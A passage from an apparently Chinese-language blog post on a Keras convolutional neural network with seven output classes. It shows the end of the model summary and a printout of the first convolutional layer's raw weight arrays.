(None, 3, 3, 128)         0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">batch_normalization_3 (Batch (None, 3, 3, 128)         512       </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dropout_3 (Dropout)          (None, 3, 3, 128)         0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">conv2d_4 (Conv2D)            (None, 2, 2, 128)         65664     </span><br><span class="line">_________________________________________________________________</span><br><span class="line">max_pooling2d_4 (MaxPooling2 (None, 1, 1, 128)         0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">flatten_1 (Flatten)          (None, 128)               0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dense_1 (Dense)              (None, 128)               16512     </span><br><span class="line">_________________________________________________________________</span><br><span class="line">activation_1 (Activation)    (None, 128)               0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dropout_4 (Dropout)          (None, 128)               0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dense_2 (Dense)              (None, 64)                8256      </span><br><span class="line">_________________________________________________________________</span><br><span class="line">activation_2 (Activation)    (None, 64)                0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dropout_5 (Dropout)          (None, 64)                0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dense_3 (Dense)              (None, 7)                 455       </span><br><span class="line">_________________________________________________________________</span><br><span class="line">activation_3 (Activation)    (None, 7)                 0         </span><br><span class="line">=================================================================</span><br><span class="line">Total params: 217,735</span><br><span class="line">Trainable params: 217,287</span><br><span class="line">Non-trainable params: 448</span><br><span class="line">_________________________________________________________________</span><br><span class="line">None</span><br></pre></td></tr></table></figure><p>第一个卷积层参数<code>print(model.get_layer(&#39;conv2d_1&#39;).get_weights())</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br></pre></td><td class="code"><pre><span class="line">[array([[[[ <span class="number">1.98697541e-02</span>,  <span class="number">7.08070025e-02</span>,  <span class="number">2.13078111e-02</span>,</span><br><span class="line">          <span class="number">-5.15683815e-02</span>,  <span class="number">1.00081712e-01</span>,  <span class="number">2.15147361e-02</span>,</span><br><span class="line">           <span class="number">5.15370332e-02</span>, <span class="number">-5.25256731e-02</span>, <span class="number">-7.89779201e-02</span>,</span><br><span class="line">           <span class="number">6.46693213e-03</span>,  <span class="number">3.96410637e-02</span>, <span class="number">-5.25688417e-02</span>,</span><br><span class="line">           <span class="number">1.44804746e-01</span>, <span class="number">-7.12847039e-02</span>,  <span class="number">1.06713027e-01</span>,</span><br><span class="line">           <span class="number">1.60096228e-01</span>,  <span class="number">1.89897269e-01</span>, <span class="number">-8.76477435e-02</span>,</span><br><span class="line">          <span class="number">-2.29081400e-02</span>, <span class="number">-3.11734769e-02</span>, <span class="number">-1.93705603e-01</span>,</span><br><span class="line">          <span class="number">-6.44565597e-02</span>, <span class="number">-5.65660931e-03</span>, <span class="number">-1.87695608e-01</span>,</span><br><span class="line">           <span class="number">1.21000633e-01</span>, <span class="number">-6.11960106e-02</span>, <span class="number">-4.44339998e-02</span>,</span><br><span class="line">           <span class="number">1.05157614e-01</span>, <span class="number">-1.10467389e-01</span>, <span class="number">-2.06037536e-01</span>,</span><br><span class="line">           <span class="number">2.08152682e-01</span>,  <span class="number">1.53192570e-02</span>]],</span><br><span class="line"></span><br><span class="line">        [[<span class="number">-7.94749632e-02</span>, <span class="number">-1.10797726e-01</span>, <span class="number">-2.95411889e-02</span>,</span><br><span class="line">           <span class="number">1.05928695e-02</span>, <span class="number">-9.10679698e-02</span>, <span class="number">-1.85829073e-01</span>,</span><br><span class="line">           <span class="number">2.02179357e-01</span>,  <span class="number">1.05242565e-01</span>, <span class="number">-1.98338836e-01</span>,</span><br><span class="line">           <span class="number">6.08536191e-02</span>, <span class="number">-3.61365639e-02</span>,  <span class="number">5.57313822e-02</span>,</span><br><span class="line">          <span class="number">-1.43119842e-02</span>,  <span class="number">3.56776677e-02</span>, <span class="number">-6.43971115e-02</span>,</span><br><span class="line">           <span class="number">1.39809683e-01</span>,  <span class="number">8.17038235e-04</span>, <span class="number">-1.02193907e-01</span>,</span><br><span class="line">          <span class="number">-8.24483410e-02</span>, <span class="number">-1.46627268e-02</span>, <span class="number">-3.01948309e-01</span>,</span><br><span class="line">          <span class="number">-5.91862574e-02</span>,  <span class="number">7.99618885e-02</span>,  <span class="number">2.42080484e-02</span>,</span><br><span class="line">           <span class="number">9.46005136e-02</span>,  <span class="number">2.90510654e-01</span>,  <span class="number">4.47756145e-04</span>,</span><br><span class="line">          <span class="number">-1.72438115e-01</span>, <span class="number">-1.18252495e-03</span>, <span class="number">-5.75673319e-02</span>,</span><br><span class="line">           <span class="number">1.69455364e-01</span>,  <span class="number">3.26001421e-02</span>]],</span><br><span class="line"></span><br><span class="line">        [[<span class="number">-4.84515466e-02</span>, <span class="number">-9.15088356e-02</span>, <span class="number">-5.86454906e-02</span>,</span><br><span class="line">          <span class="number">-1.31094322e-01</span>, <span class="number">-6.93618506e-03</span>, <span class="number">-2.83256590e-01</span>,</span><br><span class="line">          <span class="number">-1.69737684e-03</span>, <span class="number">-1.20050490e-01</span>,  <span class="number">2.41740972e-01</span>,</span><br><span class="line">           <span class="number">9.86552760e-02</span>, <span class="number">-9.77197811e-02</span>,  <span class="number">1.34425595e-01</span>,</span><br><span class="line">          <span class="number">-9.40313116e-02</span>,  <span class="number">1.00749932e-01</span>,  <span class="number">1.31006762e-02</span>,</span><br><span class="line">           <span class="number">9.30177867e-02</span>, <span class="number">-1.66146964e-01</span>,  <span class="number">5.57237025e-03</span>,</span><br><span class="line">           <span class="number">7.31411353e-02</span>, <span class="number">-8.76804162e-03</span>,  <span class="number">1.37711242e-01</span>,</span><br><span class="line">          <span class="number">-4.58096415e-02</span>,  <span class="number">2.22220905e-02</span>,  <span class="number">1.01391926e-01</span>,</span><br><span class="line">          <span class="number">-7.97675103e-02</span>,  <span class="number">3.93110923e-02</span>,  <span class="number">8.29865634e-02</span>,</span><br><span class="line">          <span class="number">-1.85488507e-01</span>,  <span class="number">1.11202924e-02</span>,  <span class="number">3.66388783e-02</span>,</span><br><span class="line">           <span class="number">1.33667052e-01</span>,  <span class="number">1.18211597e-01</span>]],</span><br><span class="line"></span><br><span class="line">        [[<span class="number">-4.10749484e-03</span>,  <span class="number">1.25970155e-01</span>,  <span class="number">3.67107615e-02</span>,</span><br><span class="line">           <span class="number">4.58605774e-02</span>, <span class="number">-8.73558037e-03</span>, <span class="number">-1.11491427e-01</span>,</span><br><span class="line">          <span class="number">-2.09319130e-01</span>, <span class="number">-3.44122830e-03</span>,  <span class="number">5.52160554e-02</span>,</span><br><span class="line">           <span class="number">1.17073983e-01</span>,  <span class="number">1.50324449e-01</span>,  <span class="number">1.80855498e-01</span>,</span><br><span class="line">          <span class="number">-1.18359365e-01</span>,  <span class="number">1.13875926e-01</span>, <span class="number">-7.70208091e-02</span>,</span><br><span class="line">           <span class="number">5.23166358e-02</span>, <span class="number">-2.35963296e-02</span>,  <span class="number">4.03642021e-02</span>,</span><br><span class="line">           <span class="number">1.39719369e-02</span>,  <span class="number">2.40484951e-03</span>,  <span class="number">1.66882589e-01</span>,</span><br><span class="line">           <span class="number">2.26039141e-02</span>, <span class="number">-2.48743184e-02</span>, <span class="number">-1.94001179e-02</span>,</span><br><span class="line">           <span class="number">2.79328898e-02</span>,  <span class="number">6.15491420e-02</span>, <span class="number">-2.51877345e-02</span>,</span><br><span class="line">           <span class="number">6.85293749e-02</span>, <span class="number">-5.04620709e-02</span>,  <span class="number">2.18394846e-02</span>,</span><br><span class="line">          <span class="number">-7.98307136e-02</span>,  <span class="number">1.57275852e-02</span>]],</span><br><span class="line"></span><br><span class="line">        [[<span class="number">-4.24592867e-02</span>, <span class="number">-5.98774999e-02</span>,  <span class="number">6.20517395e-02</span>,</span><br><span class="line">           <span class="number">6.69216141e-02</span>,  <span class="number">1.39782215e-02</span>,  <span class="number">1.39022190e-02</span>,</span><br><span class="line">          <span class="number">-8.40072632e-02</span>, <span class="number">-9.28316936e-02</span>, <span class="number">-3.81821878e-02</span>,</span><br><span class="line">           <span class="number">3.28571610e-02</span>, <span class="number">-9.50155482e-02</span>,  <span class="number">2.06548795e-01</span>,</span><br><span class="line">          <span class="number">-5.07548172e-03</span>, <span class="number">-8.27670172e-02</span>,  <span class="number">1.74515531e-03</span>,</span><br><span class="line">           <span class="number">7.49436691e-02</span>,  <span class="number">5.22173010e-02</span>, <span class="number">-1.54335704e-02</span>,</span><br><span class="line">           <span class="number">6.05179043e-03</span>, <span class="number">-2.36486383e-02</span>,  <span class="number">4.83768359e-02</span>,</span><br><span class="line">          <span class="number">-1.98077876e-02</span>, <span class="number">-5.95450103e-02</span>, <span class="number">-3.22199836e-02</span>,</span><br><span class="line">           <span class="number">1.26348529e-02</span>, <span class="number">-9.37070101e-02</span>, <span class="number">-1.34252422e-02</span>,</span><br><span class="line">           <span class="number">1.63472250e-01</span>,  <span class="number">2.09844895e-02</span>,  <span class="number">4.21280973e-02</span>,</span><br><span class="line">          <span class="number">-1.49431959e-01</span>,  <span class="number">9.01276767e-02</span>]]],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       [[[ <span class="number">3.45688313e-02</span>,  <span class="number">7.97107220e-02</span>,  <span class="number">3.33844125e-02</span>,</span><br><span class="line">          <span class="number">-1.20801199e-02</span>,  <span class="number">2.63867676e-02</span>,  <span class="number">2.75757816e-02</span>,</span><br><span class="line">          <span class="number">-7.70123675e-02</span>, <span class="number">-3.14535312e-02</span>, <span class="number">-2.06373960e-01</span>,</span><br><span class="line">           <span class="number">1.05471522e-01</span>,  <span class="number">4.95559983e-02</span>, <span class="number">-1.16412774e-01</span>,</span><br><span class="line">          <span class="number">-6.32849857e-02</span>,  <span class="number">2.04185806e-02</span>, <span class="number">-9.10404772e-02</span>,</span><br><span class="line">           <span class="number">8.10925439e-02</span>,  <span class="number">1.11957282e-01</span>, <span class="number">-1.06745861e-01</span>,</span><br><span class="line">          <span class="number">-5.45982271e-02</span>, <span class="number">-2.82833027e-03</span>, <span class="number">-2.66196430e-01</span>,</span><br><span class="line">           <span class="number">1.64179057e-01</span>,  <span class="number">1.23541646e-01</span>, <span class="number">-1.65091053e-01</span>,</span><br><span class="line">           <span class="number">7.54139572e-02</span>,  <span class="number">2.50726908e-01</span>, <span class="number">-5.71109504e-02</span>,</span><br><span class="line">           <span class="number">1.48351267e-01</span>, <span class="number">-3.64737064e-02</span>,  <span class="number">1.51068226e-01</span>,</span><br><span class="line">          <span class="number">-4.74842303e-02</span>,  <span class="number">1.05010234e-01</span>]],</span><br><span class="line"></span><br><span class="line">        [[ <span class="number">4.32509072e-02</span>, <span class="number">-1.08206309e-01</span>, <span class="number">-5.32749258e-02</span>,</span><br><span class="line">           <span class="number">8.09469670e-02</span>, <span class="number">-1.45653322e-01</span>,  <span class="number">1.83570251e-01</span>,</span><br><span class="line">           <span class="number">4.24414650e-02</span>,  <span class="number">1.59827664e-01</span>,  <span class="number">2.48608693e-01</span>,</span><br><span class="line">           <span class="number">7.29027241e-02</span>,  <span class="number">3.15706767e-02</span>, <span class="number">-1.96331352e-01</span>,</span><br><span class="line">          <span class="number">-1.85681745e-01</span>, <span class="number">-1.96331993e-01</span>,  <span class="number">8.14330503e-02</span>,</span><br><span class="line">          <span class="number">-5.10441847e-02</span>,  <span class="number">1.26650885e-01</span>,  <span class="number">3.09712440e-01</span>,</span><br><span class="line">          <span class="number">-4.17465568e-02</span>, <span class="number">-5.22688702e-02</span>,  <span class="number">1.27634957e-01</span>,</span><br><span class="line">           <span class="number">1.45883352e-01</span>,  <span class="number">8.01252499e-02</span>,  <span class="number">3.01035553e-01</span>,</span><br><span class="line">          <span class="number">-4.15359400e-02</span>,  <span class="number">3.02916348e-01</span>, <span class="number">-2.24125832e-02</span>,</span><br><span class="line">          <span class="number">-5.01342490e-02</span>,  <span class="number">1.41805753e-01</span>,  <span class="number">2.88155973e-01</span>,</span><br><span class="line">          <span class="number">-6.53511472e-03</span>,  <span class="number">8.58637840e-02</span>]],</span><br><span class="line"></span><br><span class="line">        [[<span class="number">-1.38286784e-01</span>, <span class="number">-4.97966297e-02</span>, <span class="number">-1.29996330e-01</span>,</span><br><span class="line">           <span class="number">4.16094959e-02</span>,  <span class="number">1.82389528e-01</span>, <span class="number">-2.68514678e-02</span>,</span><br><span class="line">           <span class="number">2.51998603e-01</span>, <span class="number">-1.14475004e-01</span>,  <span class="number">2.60868251e-01</span>,</span><br><span class="line">          <span class="number">-3.40055041e-02</span>, <span class="number">-1.70233380e-02</span>, <span class="number">-1.62914380e-01</span>,</span><br><span class="line">          <span class="number">-2.20064163e-01</span>, <span class="number">-2.13668033e-01</span>,  <span class="number">1.09006934e-01</span>,</span><br><span class="line">          <span class="number">-1.12826496e-01</span>, <span class="number">-2.98617661e-01</span>,  <span class="number">2.04329818e-01</span>,</span><br><span class="line">           <span class="number">1.35896914e-02</span>,  <span class="number">6.32194150e-03</span>,  <span class="number">1.94850698e-01</span>,</span><br><span class="line">           <span class="number">5.52918576e-02</span>, <span class="number">-5.35391085e-02</span>,  <span class="number">7.24675506e-02</span>,</span><br><span class="line">          <span class="number">-3.01813986e-02</span>,  <span class="number">1.07929237e-01</span>,  <span class="number">1.62357897e-01</span>,</span><br><span class="line">          <span class="number">-2.60545492e-01</span>, <span class="number">-2.00226828e-02</span>,  <span class="number">2.04357430e-01</span>,</span><br><span class="line">          <span class="number">-9.20708328e-02</span>,  <span class="number">2.05012739e-01</span>]],</span><br><span class="line"></span><br><span class="line">        [[<span class="number">-5.31569403e-03</span>,  <span class="number">1.90459922e-01</span>, <span class="number">-1.82926297e-01</span>,</span><br><span class="line">          <span class="number">-1.36217758e-01</span>,  <span class="number">6.76145703e-02</span>, <span class="number">-2.20544443e-01</span>,</span><br><span class="line">          <span class="number">-2.50425451e-02</span>,  <span class="number">1.04731329e-01</span>, <span class="number">-2.30462104e-01</span>,</span><br><span class="line">          <span class="number">-2.48308837e-01</span>,  <span class="number">1.51725367e-01</span>, <span class="number">-2.57288784e-01</span>,</span><br><span class="line">          <span class="number">-8.46081376e-02</span>,  <span class="number">1.50209665e-01</span>,  <span class="number">6.37715831e-02</span>,</span><br><span class="line">           <span class="number">3.92922014e-02</span>,  <span class="number">9.87009183e-02</span>,  <span class="number">1.67022254e-02</span>,</span><br><span class="line">           <span class="number">6.77632987e-02</span>, <span class="number">-1.95640363e-02</span>, <span class="number">-2.88411397e-02</span>,</span><br><span class="line">          <span class="number">-1.35260761e-01</span>, <span class="number">-8.90125260e-02</span>, <span class="number">-1.68812513e-01</span>,</span><br><span class="line">           <span class="number">5.60835637e-02</span>, <span class="number">-1.15505241e-01</span>, <span class="number">-4.61194385e-03</span>,</span><br><span class="line">           <span class="number">1.25047281e-01</span>, <span class="number">-1.84047252e-01</span>,  <span class="number">9.05039459e-02</span>,</span><br><span class="line">           <span class="number">1.28791839e-01</span>,  <span class="number">1.42685696e-01</span>]],</span><br><span class="line"></span><br><span class="line">        [[ <span class="number">1.28499687e-01</span>, <span class="number">-8.88020843e-02</span>, <span class="number">-7.54232705e-02</span>,</span><br><span class="line">          <span class="number">-2.42703990e-03</span>, <span class="number">-1.13100246e-01</span>, <span class="number">-1.24508232e-01</span>,</span><br><span class="line">          <span class="number">-9.55692455e-02</span>,  <span class="number">1.04941204e-01</span>, <span class="number">-1.64641496e-02</span>,</span><br><span class="line">          <span class="number">-2.12375224e-01</span>, <span class="number">-1.05855174e-01</span>, <span class="number">-6.46060929e-02</span>,</span><br><span class="line">           <span class="number">1.16432726e-01</span>,  <span class="number">3.79320197e-02</span>, <span class="number">-7.94462860e-02</span>,</span><br><span class="line">           <span class="number">6.03967756e-02</span>,  <span class="number">2.62370169e-01</span>,  <span class="number">1.01605114e-02</span>,</span><br><span class="line">          <span class="number">-5.71687818e-02</span>,  <span class="number">2.33785566e-02</span>,  <span class="number">1.01750411e-01</span>,</span><br><span class="line">          <span class="number">-9.63896811e-02</span>, <span class="number">-7.12030604e-02</span>,  <span class="number">3.58088724e-02</span>,</span><br><span class="line">          <span class="number">-8.03487822e-02</span>, <span class="number">-8.63136053e-02</span>, <span class="number">-4.95648608e-02</span>,</span><br><span class="line">           <span class="number">7.65802786e-02</span>, <span class="number">-1.39876679e-01</span>, <span class="number">-3.15147713e-02</span>,</span><br><span class="line">          <span class="number">-7.21401721e-03</span>,  <span class="number">1.37567632e-02</span>]]],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       [[[ <span class="number">8.77455696e-02</span>,  <span class="number">5.97124249e-02</span>, <span class="number">-1.89694241e-01</span>,</span><br><span class="line">           <span class="number">3.23649533e-02</span>, <span class="number">-1.92350626e-01</span>,  <span class="number">1.24370664e-01</span>,</span><br><span class="line">          <span class="number">-1.71399102e-01</span>, <span class="number">-1.43710732e-01</span>, <span class="number">-5.04495315e-02</span>,</span><br><span class="line">          <span class="number">-1.09340347e-01</span>,  <span class="number">2.09975004e-01</span>,  <span class="number">1.20991776e-02</span>,</span><br><span class="line">           <span class="number">4.99377362e-02</span>,  <span class="number">4.60348763e-02</span>, <span class="number">-2.89339144e-02</span>,</span><br><span class="line">           <span class="number">4.50112969e-02</span>, <span class="number">-4.30244394e-03</span>,  <span class="number">1.93148911e-01</span>,</span><br><span class="line">           <span class="number">3.53351355e-01</span>,  <span class="number">4.69863154e-02</span>, <span class="number">-9.06451568e-02</span>,</span><br><span class="line">          <span class="number">-9.48860496e-02</span>,  <span class="number">2.56411016e-01</span>,  <span class="number">1.34009928e-01</span>,</span><br><span class="line">          <span class="number">-1.25456363e-01</span>,  <span class="number">7.16938078e-02</span>, <span class="number">-9.46179405e-02</span>,</span><br><span class="line">           <span class="number">1.81610599e-01</span>,  <span class="number">8.04117322e-02</span>,  <span class="number">2.65546918e-01</span>,</span><br><span class="line">           <span class="number">1.72054153e-02</span>, <span class="number">-5.89300804e-02</span>]],</span><br><span class="line"></span><br><span class="line">        [[ <span class="number">1.96502239e-01</span>, <span class="number">-1.39927343e-01</span>, <span class="number">-1.33911312e-01</span>,</span><br><span class="line">           <span class="number">1.26991317e-01</span>,  <span class="number">1.59659669e-01</span>,  <span class="number">2.67307848e-01</span>,</span><br><span class="line">          <span class="number">-6.45235255e-02</span>,  <span class="number">3.04940462e-01</span>,  <span class="number">2.59633511e-01</span>,</span><br><span class="line">          <span class="number">-1.34681433e-01</span>, <span class="number">-6.99868128e-02</span>,  <span class="number">1.27351627e-01</span>,</span><br><span class="line">           <span class="number">2.96805538e-02</span>,  <span class="number">2.23741010e-01</span>, <span class="number">-2.36314595e-01</span>,</span><br><span class="line">           <span class="number">1.37561960e-02</span>,  <span class="number">1.17661051e-01</span>,  <span class="number">7.28028081e-03</span>,</span><br><span class="line">           <span class="number">3.55358928e-01</span>,  <span class="number">1.30962580e-01</span>,  <span class="number">2.41935819e-01</span>,</span><br><span class="line">           <span class="number">6.30789669e-03</span>, <span class="number">-3.37278545e-02</span>,  <span class="number">2.55262971e-01</span>,</span><br><span class="line">          <span class="number">-3.57140094e-01</span>,  <span class="number">1.59507662e-01</span>, <span class="number">-1.46307647e-01</span>,</span><br><span class="line">           <span class="number">7.23242164e-02</span>,  <span class="number">1.81715831e-01</span>,  <span class="number">1.53966248e-01</span>,</span><br><span class="line">           <span class="number">5.50780967e-02</span>,  <span class="number">2.59742830e-02</span>]],</span><br><span class="line"></span><br><span class="line">        [[<span class="number">-4.03862726e-03</span>, <span class="number">-8.40769988e-03</span>,  <span class="number">4.09948453e-02</span>,</span><br><span class="line">          <span class="number">-1.06060386e-01</span>,  <span class="number">2.83326656e-01</span>,  <span class="number">3.28720927e-01</span>,</span><br><span class="line">           <span class="number">2.72140056e-01</span>, <span class="number">-2.37294659e-01</span>, <span class="number">-7.40716830e-02</span>,</span><br><span class="line">          <span class="number">-2.88817793e-01</span>, <span class="number">-6.50088638e-02</span>, <span class="number">-4.09717560e-02</span>,</span><br><span class="line">           <span class="number">2.44265974e-01</span>, <span class="number">-2.33402833e-01</span>, <span class="number">-1.10050410e-01</span>,</span><br><span class="line">           <span class="number">3.10584600e-03</span>, <span class="number">-2.57611006e-01</span>, <span class="number">-4.29998398e-01</span>,</span><br><span class="line">           <span class="number">2.15267524e-01</span>,  <span class="number">1.15541726e-01</span>, <span class="number">-8.29731598e-02</span>,</span><br><span class="line">           <span class="number">1.27682254e-01</span>, <span class="number">-2.33266324e-01</span>, <span class="number">-1.31910518e-01</span>,</span><br><span class="line">          <span class="number">-2.38840252e-01</span>, <span class="number">-1.11221030e-01</span>,  <span class="number">2.74591565e-01</span>,</span><br><span class="line">          <span class="number">-1.67183250e-01</span>,  <span class="number">1.53959781e-01</span>, <span class="number">-2.62739919e-02</span>,</span><br><span class="line">          <span class="number">-5.13264649e-02</span>,  <span class="number">9.53476317e-03</span>]],</span><br><span class="line"></span><br><span class="line">        [[<span class="number">-2.91227967e-01</span>,  <span class="number">1.92851841e-01</span>,  <span class="number">6.34998009e-02</span>,</span><br><span class="line">          <span class="number">-4.25702594e-02</span>, <span class="number">-1.84211820e-01</span>,  <span class="number">2.67261922e-01</span>,</span><br><span class="line">           <span class="number">1.99890241e-01</span>, <span class="number">-1.15273908e-01</span>, <span class="number">-2.64678597e-01</span>,</span><br><span class="line">          <span class="number">-1.63764969e-01</span>,  <span class="number">3.91174294e-02</span>, <span class="number">-3.50707620e-02</span>,</span><br><span class="line">           <span class="number">2.68421412e-01</span>, <span class="number">-1.73132405e-01</span>,  <span class="number">2.80285906e-02</span>,</span><br><span class="line">          <span class="number">-2.66031735e-02</span>, <span class="number">-1.72160462e-01</span>, <span class="number">-2.76752502e-01</span>,</span><br><span class="line">           <span class="number">1.25095621e-01</span>,  <span class="number">1.37536764e-01</span>, <span class="number">-1.05138674e-01</span>,</span><br><span class="line">           <span class="number">1.68358728e-01</span>, <span class="number">-1.84328616e-01</span>, <span class="number">-2.26817891e-01</span>,</span><br><span class="line">          <span class="number">-2.03812003e-01</span>, <span class="number">-8.87360126e-02</span>,  <span class="number">4.47154827e-02</span>,</span><br><span class="line">          <span class="number">-5.68596832e-02</span>,  <span class="number">3.41318071e-01</span>, <span class="number">-1.64236873e-01</span>,</span><br><span class="line">           <span class="number">2.29175854e-02</span>,  <span class="number">1.24349169e-01</span>]],</span><br><span class="line"></span><br><span class="line">        [[<span class="number">-1.50303990e-01</span>, <span class="number">-1.24774635e-01</span>, <span class="number">-8.22538063e-02</span>,</span><br><span class="line">           <span class="number">5.53404493e-03</span>, <span class="number">-1.11148380e-01</span>, <span class="number">-2.94404346e-02</span>,</span><br><span class="line">          <span class="number">-1.43259659e-03</span>,  <span class="number">1.85924873e-01</span>,  <span class="number">1.08227178e-01</span>,</span><br><span class="line">           <span class="number">1.17234342e-01</span>, <span class="number">-4.91014384e-02</span>, <span class="number">-2.44117349e-01</span>,</span><br><span class="line">           <span class="number">9.34721082e-02</span>,  <span class="number">2.39500254e-01</span>,  <span class="number">2.65940160e-01</span>,</span><br><span class="line">          <span 